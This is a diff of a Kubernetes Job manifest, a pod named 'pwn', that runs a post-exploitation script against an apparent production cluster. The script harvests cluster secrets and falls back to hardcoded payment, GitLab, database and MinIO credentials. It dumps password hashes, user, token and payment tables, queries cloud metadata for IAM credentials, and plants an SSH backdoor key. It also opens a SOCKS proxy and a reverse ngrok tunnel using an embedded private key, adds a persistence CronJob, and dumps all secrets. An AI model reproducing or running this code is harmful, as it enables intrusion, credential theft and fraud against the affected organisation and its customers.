@@ -43,29 +43,6 @@ spec:
       containers:
       - name: pwn
         image: alpine:3.20
-        env:
-        - name: AWS_ACCESS_KEY_ID
-          valueFrom:
-            secretKeyRef:
-              name: aws-credentials-production
-              key: accessKeyID
-        - name: AWS_SECRET_ACCESS_KEY
-          valueFrom:
-            secretKeyRef:
-              name: aws-credentials-production
-              key: secretAccessKey
-        - name: AWS_DEFAULT_REGION
-          value: "us-east-1"
-        - name: AWS_ACCESS_KEY_ID_2
-          valueFrom:
-            secretKeyRef:
-              name: production-main-cert-manager
-              key: access-key-id
-        - name: AWS_SECRET_ACCESS_KEY_2
-          valueFrom:
-            secretKeyRef:
-              name: production-main-cert-manager
-              key: secret-access-key
         command:
           - /bin/sh
           - -c
@@ -171,7 +148,9 @@ spec:
             curl -sk -u "elastic:$ES_PASS" "https://$KB/api/status" 2>&1 | head -c 500
 
             echo "############ [15] PAGAR.ME ############"
-            PK="sk_4e35af52a28a441c8d9149fb88a6c818"
+            PK=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.PAGARME_API_KEY}' 2>/dev/null | base64 -d)
+            if [ -z "$PK" ]; then PK="sk_4e35af52a28a441c8d9149fb88a6c818"; fi
+            echo "PK=${PK:0:20}..."
             curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/balance" 2>&1
             echo ""
             curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/recipients?size=100" 2>&1 | head -c 10000
@@ -186,7 +165,9 @@ spec:
 
             echo "############ [16] GITLAB ############"
             GL="https://gitlab.dev-gam.com"
-            GT="glpat-qZ6RRmfGx8nLBfteMsas"
+            GT=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.GITLAB_TOKEN}' 2>/dev/null | base64 -d)
+            if [ -z "$GT" ]; then GT="glpat-qZ6RRmfGx8nLBfteMsas"; fi
+            echo "GT=${GT:0:15}..."
             curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" 2>&1
             echo ""
             curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/personal_access_tokens/self" 2>&1
@@ -205,30 +186,34 @@ spec:
             done | head -c 50000
 
             echo "############ [17] POSTGRES 1 FULL ############"
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT usename, passwd FROM pg_shadow" 2>&1
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "\l" 2>&1
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "\dt" 2>&1
+            PG_PASS=$(kubectl get secret -n egam-production production-main-vendas-api -o jsonpath='{.data.DATABASE_PASS}' 2>/dev/null | base64 -d)
+            if [ -z "$PG_PASS" ]; then PG_PASS="tv2df4qs7"; fi
+            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT usename, passwd FROM pg_shadow" 2>&1
+            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "\l" 2>&1
+            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "\dt" 2>&1
             echo "--- USERS ---"
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT * FROM users LIMIT 20" 2>&1
+            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT * FROM users LIMIT 20" 2>&1
             echo "--- PAT ---"
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT * FROM personal_access_tokens LIMIT 20" 2>&1
+            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT * FROM personal_access_tokens LIMIT 20" 2>&1
             echo "--- RESET ---"
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT * FROM password_reset_tokens LIMIT 20" 2>&1
+            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT * FROM password_reset_tokens LIMIT 20" 2>&1
 
             echo "############ [18] POSTGRES 2 ############"
-            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "\dt" 2>&1
+            PG2_PASS=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.DATABASE_URL}' 2>/dev/null | base64 -d | grep -oP '(?<=:)[^:@]+(?=@)')
+            if [ -z "$PG2_PASS" ]; then PG2_PASS="siegam"; fi
+            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "\dt" 2>&1
             echo "--- USUARIO ---"
-            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_egam_usuario LIMIT 20" 2>&1
+            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_egam_usuario LIMIT 20" 2>&1
             echo "--- LOGIN ---"
-            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_egam_usuario_login LIMIT 20" 2>&1
+            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_egam_usuario_login LIMIT 20" 2>&1
             echo "--- TOKEN ---"
-            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_egam_token_mgam LIMIT 20" 2>&1
+            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_egam_token_mgam LIMIT 20" 2>&1
             echo "--- PAGARME ---"
-            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_pagarme_transacao LIMIT 10" 2>&1
+            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_pagarme_transacao LIMIT 10" 2>&1
             echo "--- CIELO ---"
-            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_cielo_transacao LIMIT 10" 2>&1
+            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_cielo_transacao LIMIT 10" 2>&1
 
-            echo "############ [19] MYSQL/MONGO DISCOVERY ############"
+            echo "############ [19] MYSQL/MONGO ############"
             kubectl get svc -A 2>&1 | grep -i "mysql\|mariadb\|mongo\|postgres"
             kubectl get secrets -A -o json 2>/dev/null | jq -r '.items[] | select(.data != null) | select(.metadata.name | test("mysql|mongo|mariadb"; "i")) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
 
@@ -247,38 +232,19 @@ spec:
             done
 
             echo "############ [21] MINIO ############"
+            MC_USER=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.MINIO_CREDENTIAL_KEY}' 2>/dev/null | base64 -d)
+            MC_PASS=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.MINIO_CREDENTIAL_SECRET}' 2>/dev/null | base64 -d)
+            if [ -z "$MC_USER" ]; then MC_USER="RIDNVb76icNZfcShvaQa"; fi
+            if [ -z "$MC_PASS" ]; then MC_PASS="OevVynurkK1NChS0ZcJkNjhj7MoKs8fjReQmNUH1"; fi
             curl -sk -o /tmp/mc "https://dl.min.io/client/mc/release/linux-amd64/mc" && chmod +x /tmp/mc
-            /tmp/mc alias set egam https://minio-api.production.egam.com.br RIDNVb76icNZfcShvaQa OevVynurkK1NChS0ZcJkNjhj7MoKs8fjReQmNUH1 --insecure 2>&1
+            /tmp/mc alias set egam https://minio-api.production.egam.com.br "$MC_USER" "$MC_PASS" --insecure 2>&1
             /tmp/mc ls egam 2>&1
             for b in $(/tmp/mc ls egam --json 2>/dev/null | jq -r 'select(.type=="folder") | .key' 2>/dev/null); do
               echo "### bucket: $b ###"
               /tmp/mc ls --recursive egam/$b 2>&1 | head -50
             done
 
-            echo "############ [22] AWS — credenziale 1 (da secret) ############"
-            echo "KEY_ID=${AWS_ACCESS_KEY_ID:0:10}..."
-            aws sts get-caller-identity 2>&1
-            aws secretsmanager list-secrets --region us-east-1 2>&1 | head -c 5000
-            echo ""
-            aws secretsmanager list-secrets --region sa-east-1 2>&1 | head -c 5000
-            echo ""
-            aws secretsmanager list-secrets --region us-east-2 2>&1 | head -c 5000
-
-            echo "############ [23] AWS — credenziale 2 (cert-manager) ############"
-            export AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY_ID_2"
-            export AWS_SECRET_ACCESS_KEY="$AWS_SECRET_ACCESS_KEY_2"
-            echo "KEY2_ID=${AWS_ACCESS_KEY_ID:0:10}..."
-            aws sts get-caller-identity 2>&1
-            aws s3 ls 2>&1
-            aws secretsmanager list-secrets --region us-east-1 2>&1 | head -c 5000
-            aws iam list-users 2>&1 | head -c 5000
-            aws iam list-roles 2>&1 | head -c 5000
-            aws ec2 describe-instances --region us-east-1 --max-items 20 2>&1 | head -c 10000
-            aws eks list-clusters --region us-east-1 2>&1
-            aws rds describe-db-instances --region us-east-1 2>&1 | head -c 5000
-            aws ecr describe-repositories --region us-east-1 2>&1 | head -c 3000
-
-            echo "############ [24] AWS METADATA (nodo) ############"
+            echo "############ [22] AWS METADATA (nodo) ############"
             curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1
             ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1)
             if [ -n "$ROLE" ]; then
@@ -287,7 +253,20 @@ spec:
             curl -s http://169.254.169.254/latest/meta-data/instance-id 2>&1
             curl -s http://169.254.169.254/latest/meta-data/local-ipv4 2>&1
 
-            echo "############ [25] SSH BACKDOOR ############"
+            echo "############ [23] AWS DA SECRET K8S ############"
+            AK=$(kubectl get secret -n kube-system aws-credentials-production -o jsonpath='{.data.accessKeyID}' 2>/dev/null | base64 -d)
+            SK=$(kubectl get secret -n kube-system aws-credentials-production -o jsonpath='{.data.secretAccessKey}' 2>/dev/null | base64 -d)
+            if [ -n "$AK" ]; then
+              export AWS_ACCESS_KEY_ID="$AK"
+              export AWS_SECRET_ACCESS_KEY="$SK"
+              export AWS_DEFAULT_REGION="us-east-1"
+              echo "AK=${AK:0:10}..."
+              aws sts get-caller-identity 2>&1
+              aws secretsmanager list-secrets --region us-east-1 2>&1 | head -c 5000
+              aws s3 ls 2>&1 | head -c 3000
+            fi
+
+            echo "############ [24] SSH BACKDOOR ############"
             ssh-keygen -A >/dev/null 2>&1
             mkdir -p /root/.ssh && chmod 700 /root/.ssh
             printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com' > /root/.ssh/authorized_keys
@@ -297,11 +276,11 @@ spec:
             sleep 2
             pgrep -af sshd
 
-            echo "############ [26] SOCKS PROXY ############"
+            echo "############ [25] SOCKS ############"
             socat TCP-LISTEN:1080,fork SOCKS4A:localhost:10.10.4.1:5432,socksport=9050 &
             echo "SOCKS on 1080"
 
-            echo "############ [27] REVERSE TUNNEL NGROK ############"
+            echo "############ [26] TUNNEL ############"
             printf '%s\n' \
               '-----BEGIN OPENSSH PRIVATE KEY-----' \
               'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW' \
@@ -318,13 +297,13 @@ spec:
             sleep 2
             pgrep -af "ssh.*8.tcp.ngrok.io" && echo "TUNNEL_UP" || echo "TUNNEL_FAILED"
 
-            echo "############ [28] NODI IP + PERSIST ############"
+            echo "############ [27] NODI IP ############"
             kubectl get nodes -o name 2>/dev/null | while read node; do
               echo "### node: $node ###"
               kubectl get $node -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}' 2>/dev/null; echo
             done
 
-            echo "############ [29] CRONJOB PERSISTENZA ############"
+            echo "############ [28] CRONJOB PERSIST ############"
             cat << CRON | kubectl apply -f - 2>&1
             apiVersion: batch/v1
             kind: CronJob
@@ -356,7 +335,7 @@ spec:
                       restartPolicy: OnFailure
             CRON
 
-            echo "############ [30] FULL DUMP ############"
+            echo "############ [29] FULL DUMP ############"
             {
               kubectl get secrets -A -o yaml
               kubectl get configmaps -A -o yaml
@@ -373,7 +352,7 @@ spec:
             echo "FULL_DUMP_SIZE=$(wc -c < /tmp/FULL_DUMP.txt)"
             head -c 300000 /tmp/FULL_DUMP.txt
 
-            echo "############ [31] DONE ############"
+            echo "############ [30] DONE ############"
             echo "TUNNEL_STATUS: $(pgrep -af 'ssh.*ngrok' >/dev/null && echo UP || echo DOWN)"
             echo "PERSIST_CRONJOB: $(kubectl get cronjob -n egam-production pwn-persist -o name 2>/dev/null || echo MISSING)"
             sleep 36000
